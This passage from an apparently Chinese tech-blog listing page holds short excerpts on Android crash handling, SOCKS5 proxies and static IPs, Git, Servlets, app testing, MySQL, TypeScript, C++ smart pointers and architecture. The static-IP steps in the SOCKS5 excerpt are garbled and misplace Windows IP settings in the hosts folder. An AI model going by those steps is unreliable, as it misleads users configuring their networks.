	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2ee45653a86e0816d04859e51448764/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a201a1c7472dcb4e5771c0a6cad61ebf/" rel="bookmark">
			android 导航app 稳定性问题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 重写全局异常处理：
1 是过滤掉一些已知的无法处理的
问题，比如TimeoutException 这种无法根除只能缓解的问题可以直接catch掉
2 是 一些无法继续的问题可以直接杀死重启，一些影响不是很大的，可以局部还原
比如：
public class MyUncaughtExceptionHandler implements Thread.UncaughtExceptionHandler { private static final String TAG = "MyUncaughtExceptionHandler"; @Override public void uncaughtException(Thread thread, Throwable ex) { ex.printStackTrace(); if (null != thread) { LogUtils.e("killProcess thread name is " + thread.getName()); } LogUtils.e(ex); Log.e(TAG, "MyUncaughtExceptionHandler_Exception: " + Log.getStackTraceString(ex)); if (null != thread &amp;&amp; "FinalizerWatchdogDaemon".equalsIgnoreCase(thread.getName()) &amp;&amp; ex instanceof TimeoutException) { //https://segmentfault.com/a/1190000019373275 LogUtils.e("FinalizerWatchdogDaemon TimeoutException"); } else { LogUtils.e("MyUncaughtExceptionHandler "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a201a1c7472dcb4e5771c0a6cad61ebf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9275af68373e94d1787b51ffd6e10a07/" rel="bookmark">
			socks5代理怎么设置切换IP地址？怎么把动态ip改成静态ip？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在当今的网络时代，代理服务器已经成为保护个人隐私和突破网络限制的重要工具。其中，SOCKS5代理是最常用的一种代理类型，它支持各种协议，如TCP和UDP，可以提供更高效和灵活的代理服务。然而，在使用SOCKS5代理时，有时我们需要切换IP地址或者将动态IP改为静态IP。本文将详细介绍如何设置和切换SOCKS5代理的IP地址，以及如何将动态IP改为静态IP。
来百度APP畅享高清图片
一、如何设置和切换SOCKS5代理的IP地址
1. 打开网络设置
首先，我们需要打开网络设置，以便对代理服务器进行配置。在Windows系统中，可以点击“开始”菜单，选择“设置”，然后点击“网络和Internet”。在macOS系统中，可以打开“系统偏好设置”，选择“网络”。
2. 配置代理服务器
在打开网络设置后，我们需要找到代理服务器设置选项。在Windows系统中，可以在“代理”选项卡下进行配置。在macOS系统中，可以在“高级”选项下的“代理”中进行配置。
3. 添加SOCKS5代理
在代理服务器设置中，我们需要添加SOCKS5代理。在Windows系统中，可以点击“添加代理服务器”，然后输入代理服务器的IP地址和端口号。在macOS系统中，可以在“代理”菜单下选择“编辑代理服务器”，然后添加代理服务器。
4. 切换IP地址
如果需要切换IP地址，只需要重新配置代理服务器，将新的IP地址和端口号输入到相应的位置即可。在Windows系统中，可以点击“删除代理服务器”来移除旧的代理服务器配置。在macOS系统中，可以在“代理”菜单下选择“移除代理服务器”。
二、如何将动态IP改为静态IP
1. 找到IP配置文件
对于大多数操作系统来说，网络接口卡的IP配置信息通常存储在特定的文件中。在Windows系统中，这些文件通常位于“C:\Windows\System32\drivers\etc\”目录下。在macOS系统中，这些文件通常位于“/private/etc/”目录下。
2. 编辑IP配置文件
使用文本编辑器打开相应的IP配置文件。在Windows系统中，可以使用记事本或者其他文本编辑器打开这些文件。在macOS系统中，可以使用文本编辑或者Nano等文本编辑器打开这些文件。
3. 修改IP地址
在IP配置文件中，我们需要找到类似于以下内容的行：
“inet &lt;dynamic_ip&gt; &lt;subnet_mask&gt;地址即可。例如：
“inet 192.168.0.100 255.255.255.0 192.168.0.1 8.8.8.8 8.8.4.4 example.com example”
4. 保存并重启网络服务
保存所做的更改并重新启动网络服务。在Windows系统中，可以重新启动计算机以使更改生效。在macOS系统中，可以尝试重启网络接口卡或者整个系统以使更改生效。
需要注意的是，将动态IP改为静态IP可能会导致一些问题。例如，如果静态IP地址不在当前子网中，可能会导致无法访问其他网络设备。此外，如果该静态IP已被其他设备使用，可能会导致冲突。因此，在进行此类更改之前，请务必仔细考虑并确保了解所有潜在的风险和后果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8ad073e5bd3b9c87dc01e2d6300fee0/" rel="bookmark">
			Git 开发日常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Traditional Ways [分支名]$ git checkout -b dev #开发的时候创建一条自己的分支 ############################ ########## 开发 ############# ############################ [dev] $ git rebase -i master #合并提交记录 # 切换到 master 分支拉取最新代码 [dev] $ git checkout master [master]$ git pull [master]$ git checkout dev # 将最新代码合并到 dev 分支 [dev] $ git rebase master #有冲突解决冲突，继续：git rebase --continue # 推送远程 [dev]$ git push origin dev:dev [gitlab-web] 在网页端提交 Merge Request 或开发负责人(有 master 权限的人)自己合并 [dev] $ git checkout master [master]$ git merge dev Tips: 重心放在本地。除了 git push, 其他常用命令不会对远程仓库造成破坏性影响
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8ad073e5bd3b9c87dc01e2d6300fee0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ae6206ea99170a2a8c0c37072e1bfe4/" rel="bookmark">
			Servlet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一：Servlet是一个运行在web服务端的java小程序
第二：它可以用于接收和响应客户端的请求
第三：要想实现Servlet功能，可以实现Servlet接口，继承GenericServlet或者HttpServlet
第四：每次请求都会执行service方法
第五：Servlet还支持配置
概述 Servlet 作用 1）接收客户端的请求
2）处理业务逻辑
3）响应给浏览器客户端
Servlet类视图 快速入门 步骤 1.创建web项目
2.导入servlet依赖
&lt;!--导入依赖--&gt; &lt;dependencies&gt; &lt;!--导入servlet依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3.在创建的web项目中自定义类实现Servlet接口
4.在自定义类中实现Servlet接口中的所有的抽象方法
5.在实现Servlet接口的service方法体中书写代码处理业务逻辑
void service(ServletRequest req, ServletResponse res) 6.在web项目的核心配置文件web.xml中配置访问servlet的路径。
​ 说明：这样配置是告知tomcat有具体的Servlet类需要被访问。
7.启动tomcat
8.在浏览器中访问servlet类
实现 1.创建maven的web项目
2.导入servlet的依赖
&lt;!--servlet--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;!--编译 测试需要，运行时不需要--&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; 2.在创建的web项目中自定义类实现Servlet接口
3.在自定义类中实现Servlet接口中的所有的抽象方法
4.在实现Servlet接口的service方法体中书写代码处理业务逻辑
import javax.servlet.*; import java.io.IOException; /* 2.在创建的web项目中自定义类实现Servlet接口 */ public class HelloWorldServlet implements Servlet{ //3.在自定义类中实现Servlet接口中的所有的抽象方法 //4.在实现Servlet接口的service方法体中书写代码处理业务逻辑 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ae6206ea99170a2a8c0c37072e1bfe4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b136ffc98fb4506bea3ca5930836bac0/" rel="bookmark">
			app测试知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.APP测试常用工具
在APP测试中，常用的工具有以下几种：
Appium：一个跨平台的自动化测试工具，支持对iOS和Android的原生、移动Web和混合应用进行测试。它支持使用WebDriver兼容的任何语言编写测试脚本，如Java、OC、JS、PHP、Python、Ruby、C#、Clojure和Perl等。Airtest：由网易游戏推出的一款UI自动化测试工具，适用于游戏和应用，支持的平台为Windows、Android和iOS。JMeter：Apache软件基金会的开源产品，主要用于进行性能测试。LoadRunner：一款功能强大的性能测试工具，可以模拟数万个用户并发，对系统进行压力测试，适用于复杂的系统性能测试。Robot Framework：一个通用的自动化测试框架，可以用于各种类型的测试，包括功能测试、性能测试等。Charles：一个抓包工具，可以用于截取网络传输的数据包，以便分析网络请求和响应。Xcode：苹果公司开发的集成开发环境，用于开发iOS和macOS应用，其中包含一些用于测试的工具和功能。Android Studio：Google开发的专门针对Android应用开发的集成开发环境，其中的Profiler工具可以用来进行性能测试，包括CPU、内存、网络等方面的性能测试。 此外，还有一些针对特定应用的自动化测试工具，如TestIn、腾讯优测、百度MTC和阿里MQC等。这些工具可以帮助测试人员快速有效地进行APP测试，确保应用的稳定性和性能。
2.介绍appium
Appium是一个开源的、跨平台的自动化测试框架，适用于Native App、Mobile Web App或Hybrid App的自动化测试。它支持iOS和Android操作系统，并且可以在不同的编程语言和测试框架中使用。Appium通过驱动iOS、Android和Windows应用程序的WebDriver协议来工作，并提供了多种工具和库来支持不同应用的自动化测试。
Appium的优点包括跨平台支持、支持多种语言、灵活的测试编写和执行方式、稳定的移动测试框架API等。它允许开发人员和测试人员编写测试脚本，并使用多种测试工具和框架来执行自动化测试。Appium还提供了用户友好的界面和工具，使得测试人员可以轻松地创建、运行和管理自动化测试。
总之，Appium是一个强大的自动化测试框架，可以帮助开发人员和测试人员快速有效地进行移动应用的自动化测试。通过使用Appium，测试人员可以编写可重用的测试脚本，并使用不同的测试工具和框架来执行自动化测试，从而提高测试效率和准确性。
3.appium应用场景
原生应用测试：对于那些使用iOS、Android或Windows SDKs编写的原生应用，Appium可以用于自动化测试。测试可以针对应用的各种功能，如登录、购买、导航等。移动web应用测试：Appium也可以用于测试移动web应用，特别是那些使用移动端浏览器访问的应用。这包括测试在移动设备上浏览网页时的各种功能，如填写表单、提交数据等。混合应用测试：对于带有“webview”的混合应用（即带有一个用于与web内容交互的原生控件的应用），Appium也适用。在这种情况下，需要在代码中打开webview的debug功能，然后使用Appium进行自动化测试。跨平台测试：Appium支持在多个平台上进行测试，包括iOS、Android和Windows。这意味着测试人员可以在不同的设备或模拟器上运行相同的测试脚本，以验证应用的跨平台兼容性。自动化回归测试：Appium可以用于编写自动化的回归测试脚本，以确保在应用更新或修改后，新功能不会破坏旧的功能。UI和功能测试：Appium可以用于测试应用的用户界面和功能，包括各种交互和响应。例如，测试按钮点击、滑动操作、表单输入等是否按预期工作。性能和压力测试：通过模拟大量用户同时使用应用的情况，Appium还可以用于性能和压力测试。这有助于发现应用在高负载下的性能瓶颈和潜在问题。 4.Android Studio介绍
Android Studio是谷歌推出的一个Android集成开发工具，基于IntelliJ IDEA。类似Eclipse ADT，Android Studio提供了集成的Android开发工具用于开发和调试。
Android Studio的开发环境和模式更加的丰富和便捷，能够支持多种语言，还可以为开发者提供测试工具和各种数据分析。在IDEA的基础上，Android Studio提供五大功能，包括优化小贴士、应用翻译服务、推荐跟踪、营收曲线图、用版测试和阶段性展示。同时Studio还解决语言问题，多语言版本、支持翻译都让开发者更适应全球开发环境。
此外，Android Studio还具有以下特点和功能：
集成Android开发工具：Android Studio提供了丰富的Android开发工具，包括布局编辑器、模拟器、性能分析工具等，使得开发人员可以更加高效地进行Android应用开发。支持多种语言：Android Studio不仅支持Java和Kotlin等主流编程语言，还支持C++和NDK等原生开发技术，使得开发者可以根据需要选择最适合的开发语言。灵活的构建系统：Android Studio支持Gradle构建系统，允许开发者自定义构建过程和配置，以适应不同的项目需求。强大的代码分析和调试能力：Android Studio提供了智能代码补全、代码重构、代码检查等功能，可以帮助开发者提高代码质量和可维护性。同时，它还提供了强大的调试工具，可以方便地调试应用中的各种问题。实时预览和模拟器：Android Studio的实时预览和模拟器功能使得开发者可以方便地预览和测试应用在不同设备和配置下的表现，从而提高应用的兼容性和用户体验。集成的版本控制系统：Android Studio集成了Git等版本控制系统，使得开发者可以方便地管理代码版本和协作开发。快速迭代和热更新：Android Studio支持使用Instant Run功能快速迭代和热更新应用，减少了开发和测试的时间成本。智能布局编辑器：Android Studio的布局编辑器可以自动生成XML布局文件，并且支持实时预览和布局调整，提高了布局文件的可维护性和用户体验。集成测试框架：Android Studio集成了Espresso和UI Automator等测试框架，可以帮助开发者编写自动化测试用例并进行UI测试。插件和集成开发：Android Studio支持各种插件和集成开发，使得开发者可以根据需要扩展其开发工具集。 总之，Android Studio是一个功能强大、易于使用的Android集成开发工具，提供了丰富的开发工具和功能，可以帮助开发者更加高效地进行Android应用开发。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b3bd570bde5f905e77f39b17212ebb3/" rel="bookmark">
			2017年认证杯SPSSPRO杯数学建模B题(第二阶段)岁月的印记全过程文档及程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2017年认证杯SPSSPRO杯数学建模 B题 岁月的印记 原题再现： 对同一个人来说，如果没有过改变面容的疾病、面部外伤或外科手术等经历，年轻和年老时的面容总有很大的相似性。人们在生活中也往往能够分辨出来两张不同年龄段的照片是不是同一个人。当然，年龄段相差越大，识别起来也就越困难。
第二阶段问题： 我们希望通过一个人在年轻时的面部照片来预测其过若干年后的容貌，也希望做到通过一个人在较大年龄时的照片来还原其年轻时的容貌。请你建立合理的数学模型来完成这项任务。
整体求解过程概述(摘要) 本文采用局域二值模式特征提取，SVM 支持向量机对图像人脸进行年龄预测，又利用人脸随着年龄的形状变化和纹理特征变化对不同目标年龄的人脸进行重构，还对重构后的人脸和真实人脸进行了相似度分析。
首先，为了提高模型准确率，我们对图像进行灰度均衡化、旋转调整、尺度归一化处理。我们建立了基于局域二值模式的纹理特征提取模型，并且建立了基于 BP 神经网络贡献分析法对特征向量进行降维，得出额头、嘴巴、眼角等地方对年龄的影响较大，将原维数 256 维的纹理特征向量降到 30 维。我们将降维后的特征向量作为输入，训练了加权支持向量机的年龄估计函数。同时，我们利用 FG-NET 人脸数据库验证年龄估计的支持向量回归模型，准确率达到 76.2%，且误差控制在 3 岁以内。
其次，我们选取 50 个特征点来标定人脸正面，得到了 8 个年龄段的平均脸型。接着我们建立了基于径向基函数的人脸形状变化模型，并计算出该年龄段人脸纹理特征向量，利用 LBP 算子提取的纹理特征与人脸型的变化相结合，进而重构了出目标年龄的人脸图像，其中人脸预测时进行的是纹理特征向量的叠加计算，人脸还原时进行的是纹理特征向量的差运算。
最后，我们建立基于欧氏距离的照片相似度分析模型，对模型重构出的人脸与真实的人脸进行相似度分析，检验出模型的正确率在 58.6%。我们还分析了所建模型的优缺点，讨论了模型的推广应用。
问题分析： 人脸图像识别问题是现今模式识别、图像处理等学科的一大研究热点，可以广泛的应用于安全部门、身份鉴别、电视会议、数字监控等领域。随着年龄的变化，人脸会发生变化，具体表现在色相衰老和皱纹的出现。本题要求我们在第一阶段的基础上，建立数学模型，解决通过一个人年轻时候来预测其若干年后的容貌，以及通过一个人在年老
时的照片来还原其年轻时候的容貌两个问题。
首先，我们选取了 FG-NET 年龄人脸库，该人脸数据库中的人脸图像并不是在标准光线和标准角度中拍摄的，所以我们首先进行预处理，才能使用图像数据进行建模。但由于采集的图像往往会带有很多的噪声和干扰信号，因此对于采集的人脸图像，首先需要进行规范化处理，将外界的因素带来的影响提出，这里可以采用灰度化、集合规范化（图像的平移、旋转、缩放变化）、灰度规范化（即平滑、灰度均衡化）等预处理的方法。
其次，要对图像进行面部特征提取和年龄估计，因为只有根据人脸的特征才能对其年龄进行合理的估计。可以使用 LBP 纹理特征提取算法，提取出人脸的纹理特征向量，并通过神经网络贡献分析法对特征向量作降维处理。对降维后的人脸纹理特征向量，可以使用 SVR 支持向量机回归模型， 以特征向量为输入对 SVR 进行训练，可以得到年龄估计模型。以此对图像的人脸进行较为准确的年龄估计。为下一步的人脸预测和人脸还原做准备。
然后，是人脸的重构部分。由于人脸的变化主要表现为人脸形状随年龄的变化和人脸纹理特征（青春痘、皱纹等）随年龄的变化。因此，在确定目前人脸的年龄以后，就可以以此为基础，对人脸进行重构。这里的重构有两类，一类是对预测一张年轻的脸若干年后的容貌，令一类是还原一张年老的脸若干年前的容貌。重构主要包含有两个阶段，一是对人脸形状的改变，而是对人脸纹理的变化。在预测人脸的容貌时，只要利用该年龄段的人的脸形状变化后，叠加上预测年龄段的人脸纹理特征即可。对于还原人脸容貌，则要将人脸形状还原后，去除掉相应的纹理特征。
最后，还要检验人脸重构是否合理，即检验重构后的人脸是否还是与原来的人脸是同一个，因此可以建立人脸相似度检验模型，对重构后的人脸和该年龄的人脸进行相似度分析，检验模型的准确性。
模型假设： 1. 假设人的衰老是正常衰老，不考虑人的生病、吸烟、压力大等不良生活习惯造成的非正常变老。
2. 假设本文所研究的人在成长过程中没有经历因为搬家等造成的生存环境的改变，外部环境对其造成的外貌的影响不予考虑。
3. 假设选取的人脸图像样本采取时，没有意外伤害或病变导致的人脸局部区域的形状、颜色发生显著性改变
4. 假采样人脸图像时，被采样者没有故意扭曲脸型，即为正常拍照。
论文缩略图： 全部论文请见下方“ 只会建模 QQ名片” 点击QQ名片即可 部分程序代码：(代码和文档not free) function [ opic ] = picInit( ipic ) %PICINIT 此函数用来预处理图片 mysize=size(ipic); if numel(mysize)&gt;2 tmp = rgb2gray(ipic);% 将图像灰度化 else tmp = ipic; end %灰度调整 gc = imadjust(tmp,[0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b3bd570bde5f905e77f39b17212ebb3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/170ead9b90b86435a665857fd9108984/" rel="bookmark">
			Java前端——HTTP协议中get和post的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		get 和 post是 HTTP 请求的两种方法
应用场景： 一般 get 请求用于对服务器资源不会产生影响的场景，如请求一个网页的资源
post 请求一般用于对服务器资源会产生影响的情景，如注册用户这一类的操作。
get请求一般用于向服务器请求数据，post请求一般用于向服务器提交数据
是否缓存： 浏览器一般会对 get 请求缓存，但很少对 post 请求缓存。
传参方式： get 通过 url 传参，post 通过 body 传参
参数类型： get 参数只允许 ASCII 字符，post 参数支持更多的数据类型（如文件、图片）
get请求参数：一般约定俗成放在 URL 的 query 中，而各端对URL的长度都做了不同程度的限制，因此这就是get请求数据有上限的底层原因。
安全性： query 和 body 上的参数都是明文的，HTTP本身就是不安全的协议，get 和 post 只是请求方式不同，本身并不对安全起到任何作用，真正做到安全需要双端加密。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96f924da9aade0a2338fa072af275b93/" rel="bookmark">
			MySQL修炼手册13：存储过程初探：提高数据库操作效率
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 写在开头1 存储过程的基本概念1.1 存储过程与SQL语句的对比1.2 存储过程的创建与调用 2 存储过程中的流程控制2.1 IF语句的使用2.2 循环与分支控制2.2.1 WHILE循环2.2.2 REPEAT循环2.2.3 LOOP循环2.2.4 CASE语句 3 存储过程的应用场景3.1 存储过程在业务逻辑中的应用3.1.1 数据清洗与转换3.1.2 事务管理 3.2 存储过程的优势与劣势3.2.1 优势3.2.2 劣势 写在最后 写在开头 数据库管理是一个充满挑战的领域，而MySQL的强大功能使得它成为广大开发者和管理员的首选。在我们的MySQL修炼手册的第13篇中，我们将探讨存储过程的奥秘，深入了解如何通过存储过程提高数据库操作的效率。
存储过程，作为MySQL中的一项强大工具，不仅可以简化复杂的数据操作，还能提高数据库的性能和可维护性。让我们一起进入存储过程的世界，深度挖掘其基本概念、创建与调用、流程控制以及应用场景。
1 存储过程的基本概念 在MySQL数据库中，存储过程是一组预编译的SQL语句，被保存在数据库中以供后续调用。相较于单独执行SQL语句，存储过程具有更高的复用性和可维护性。在这一部分，我们将详细展开存储过程的基本概念，包括与SQL语句的对比、存储过程的创建与调用。
1.1 存储过程与SQL语句的对比 SQL语句的执行方式：
在数据库中，我们通常使用SQL语句执行各种操作，如查询、插入、更新、删除等。SQL语句是一条一条被解释和执行的，每次执行都需要重新编译和解释。
-- 单独执行SQL语句 SELECT * FROM customers WHERE country = 'USA'; 存储过程的执行方式：
相比之下，存储过程是一组预先编写好的SQL语句，被整体保存在数据库中。它可以接受参数，执行一系列操作，最终返回结果。存储过程的执行速度相对更快，因为它不需要每次都重新编译和解释。
-- 存储过程的调用 CALL GetCustomersByCountry('USA'); 通过对比，我们可以看到存储过程的主要优势之一是提高了数据库操作的效率，尤其在需要执行多个SQL语句或进行复杂逻辑操作时。
1.2 存储过程的创建与调用 创建存储过程：
使用CREATE PROCEDURE语句可以创建存储过程。存储过程可以包含输入参数、输出参数和局部变量，具有良好的封装性。
-- 创建存储过程 DELIMITER // CREATE PROCEDURE GetCustomersByCountry (IN country_name VARCHAR(50)) BEGIN SELECT * FROM customers WHERE country = country_name; END // DELIMITER ; 在上述例子中，我们创建了一个名为GetCustomersByCountry的存储过程，接受一个输入参数country_name，并返回符合条件的顾客信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96f924da9aade0a2338fa072af275b93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bad9b3c68d87033ccbb36549972e788/" rel="bookmark">
			100天精通鸿蒙从入门到跳槽——第11天：TypeScript 知识储备：装饰器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主猫头虎的技术世界
🌟 欢迎来到猫头虎的博客 — 探索技术的无限可能！
专栏链接：
🔗 精选专栏：
《面试题大全》 — 面试准备的宝典！《IDEA开发秘籍》 — 提升你的IDEA技能！《100天精通Golang》 — Go语言学习之旅！《100天精通鸿蒙》 — 从Web/安卓到鸿蒙大师！ 100天精通鸿蒙OS（基础篇） 🚀 100天精通鸿蒙从入门到跳槽——第11天：TypeScript 知识储备：装饰器📝 摘要🌟 一、引言📘 二、正文✨ 装饰器的基本语法🌈 常见的装饰器类型🛠️ 自定义装饰器 📊 三、总结📚 四、参考资料 🚀 100天精通鸿蒙从入门到跳槽——第11天：TypeScript 知识储备：装饰器 📝 摘要 本文将深入探讨TypeScript中的装饰器（Decorators）概念和实践应用。装饰器是一种独特的语法，主要用于扩展类、方法、属性等的行为和元数据。本文将深入讲解装饰器的语法结构、常见的装饰器类型，并指导如何根据需要自定义装饰器。
🌟 一、引言 TypeScript作为JavaScript的强类型超集，不仅提供了优秀的类型检查机制，还引入了多种高级特性，其中包括装饰器。装饰器能够优雅地修改和增强类、方法和属性的功能，而且在Angular、Express等流行框架中得到了广泛应用。本文旨在帮助你全面掌握TypeScript装饰器的精髓，让你在项目开发中游刃有余。
📘 二、正文 ✨ 装饰器的基本语法 在TypeScript中，装饰器通过@符号标识，紧跟在被修饰的声明之前。
装饰器本质上是函数或表达式，其返回值为一个函数。
装饰器函数通常接收以下三个参数：
目标对象成员名称成员属性描述符 例如，下面是一个装饰器的简单示例：
function log(target: any, propertyKey: string, descriptor: PropertyDescriptor) { console.log(`Calling ${propertyKey} method`); } class MyClass { @log myMethod() { console.log('Hello, World!'); } } const obj = new MyClass(); obj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bad9b3c68d87033ccbb36549972e788/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/673d15730dd437d2fe37754cfc3ce132/" rel="bookmark">
			.net系列环境包，需要的滴滴
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		.net系列环境包，需要的滴滴
包包含两部分内容，分别是.net framework 1.0~4.8的包和.net3~8的包。
包的类型有离线包和web联网下载包。
今天忙了，一下午。
终于，在超级纯净版的Windows7 64位专业系统装了.net framework 4.0离线包，上位机程序从4.8降级到4.0，可算是能用了。重新开发咯。
我今天要改正一个错误，不在瞧不起用低版本的.net了。因为可能是环境导致，并不是开发者想要，哈哈哈。
所以后续，我会更新整个系列的版本软件。需要的滴滴啦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cbb2a1343211e1eca850d525f9bce7b/" rel="bookmark">
			C&#43;&#43;智能指针
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		普通指针不足 new和new[] 的内存需要用delete和delete[]释放程序员的主观失误，忘了或漏了释放程序员也不知道何时释放内存 智能指针设计思路 智能指针是类模板，在栈上创建智能指针对象把普通指针交给智能指针对象智能指针对象过期时，调用析构函数释放普通指针的内存 智能指针类型 auto_ptr C+++98标准 但是C++17已经弃用unique_ptr、shared_ptr和weak_ptr是C++11的标准 unique_ptr 概念 指独享指向的对象。
同一时间只有一个unique_ptr指向同一个对象，当unique_ptr被销毁时，该对象也被销毁
用法 包含 memory 头文件
初始化 //方法一 unique_ptr&lt;CBB&gt;pp(new CBB("貂蝉",20));//分配内存并初始化 //方法二 C++14标准 unique_ptr&lt;CBB&gt;p0= std::make_unique&lt;CBB&gt;("王昭君",21); //方法三 CBB *p = new CBB("西施",18); //假设我们忘记delete指针p了 那么不会调用析构函数 unique_ptr&lt;CBB&gt;pt(p);//我们使用unique_ptr智能指针管理p 用已经存在的地址初始化 使用 重载了-&gt;和*操作符，可以像使用指针一样使用unique_ptr不支持普通的拷贝和赋值不要用同一个裸指针（普通指针）初始化多个unique_ptr指针（会造成同一块内存多次释放，操作野指针）get方法返回裸指针 cout&lt;&lt;"裸指针地址："&lt;&lt;pp.get()&lt;&lt;endl; cout&lt;&lt;"pp的值："&lt;&lt;pp&lt;&lt;endl; cout&lt;&lt;"pp的地址："&lt;&lt;&amp;pp&lt;&lt;endl; /* 裸指针地址：0x2be260c62d0 pp的值：0x2be260c62d0 pp的地址：0xff023ff808 */ 不要用unique_ptr管理不是new分配的内存用于函数参数 传引用（不能传值，因为没有拷贝构造函数）裸指针 不支持指针的运算（+、-、++、–） 更多技巧 1)将一个 unique ptr 赋给另一个时，如果源 unique_ptr 是一个临时右值，编译器允许这样做;如果源 unique ptr 将存在一段时间，编译器禁止这样做。一般用于函数的返回值 class CBB{ public: int cbb; string m_name; CBB(){ cout&lt;&lt;"默认构造函数"&lt;&lt;endl; } CBB(string name,int num):m_name(name),cbb(num){ cout&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2cbb2a1343211e1eca850d525f9bce7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d6ccd1648766c9ee30d08ed0733249d/" rel="bookmark">
			架构篇01：架构的简介，到底什么是架构？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 前言2. 系统与子系统“系统”“子系统” 3. 模块与组件4. 框架与架构5. 重新定义架构总结 1. 前言 对技术人员来说，“架构”是一个再常见不过的词儿了。我们经常对新员工培训整个系统的架构，参加架构设计评审，学习业界开源系统（例如，MySQL、Hadoop）的架构，研究大公司的架构实现（例如，微信架构、淘宝架构）……虽然“架构”这个词常见，但如果深究一下“架构”到底指什么，大部分人也许并不一定能够准确地回答。例如：架构和框架是什么关系？有什么区别？
Linux 有架构，MySQL 有架构，JVM 也有架构，使用 Java 开发、MySQL 存储、跑在 Linux 上的业务系统也有架构，应该关注哪个架构呢？
淘宝有架构，微信有架构，微信的登录系统也有架构，微信的支付系统也有架构，当我们谈微信架构时，到底是在谈什么架构？
要想准确地回答这几个问题，关键在于梳理几个有关系而又相似的概念，包括：系统与子系统、模块与组件、框架与架构。
2. 系统与子系统 “系统” 系统泛指由一群有关联的个体组成，根据某种规则运作，能完成个别元件不能单独完成的工作的群体。它的意思是“总体”“整体”或“联盟”。
关联：系统是由一群有关联的个体组成的，没有关联的个体堆在一起不能成为一个系统。例如，把一个发动机和一台 PC 放在一起不能称之为一个系统，把发动机、底盘、轮胎、车架组合起来才能成为一台汽车。
规则：系统内的个体需要按照指定的规则运作，而不是单个个体各自为政。规则规定了系统内个体分工和协作的方式。例如，汽车发动机负责产生动力，然后通过变速器和传动轴，将动力输出到车轮上，从而驱动汽车前进。
能力：系统能力与个体能力有本质的差别，系统能力不是个体能力之和，而是产生了新的能力。例如，汽车能够载重前进，而发动机、变速器、传动轴、车轮本身都不具备这样的能力。
“子系统” 子系统也是由一群有关联的个体所组成的系统，多半会是更大系统中的一部分。
其实子系统的定义和系统定义是一样的，只是观察的角度有差异，一个系统可能是另外一个更大系统的子系统。
按照这个定义，系统和子系统比较容易理解。
我们以微信为例来做一个分析。
微信本身是一个系统，包含聊天、登录、支付、朋友圈等子系统。朋友圈这个系统又包括动态、评论、点赞等子系统。评论这个系统可能又包括防刷子系统、审核子系统、发布子系统、存储子系统。评论审核子系统不再包含业务意义上的子系统，而是包括各个模块或者组件，这些模块或者组件本身也是另外一个维度上的系统。例如，MySQL、Redis 等是存储系统，但不是业务子系统。 3. 模块与组件 模块和组件两个概念在实际工作中很容易混淆，我们经常能够听到类似这样的说法：
MySQL 模块主要负责存储数据，而 ElasticSearch 模块主要负责数据搜索。
我们有安全加密组件、有审核组件。
App 的下载模块使用了第三方的组件。
造成这种现象的主要原因是，模块与组件的定义并不好理解，也不能很好地进行区分。我们来看看这两者在维基百科上的定义。
